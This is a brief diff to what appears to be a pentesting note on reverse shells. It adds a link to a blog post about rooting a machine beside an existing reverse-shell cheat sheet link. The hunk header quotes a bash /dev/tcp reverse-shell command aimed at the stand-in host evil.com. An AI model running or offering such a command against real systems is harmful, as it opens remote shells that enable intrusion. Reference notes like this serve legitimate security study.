@@ -10,3 +10,4 @@ exec 5<>/dev/tcp/evil.com/<same unfiltered port> $ cat <&5 | while read line; do
 ## Links
 
  - [Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+ - https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/
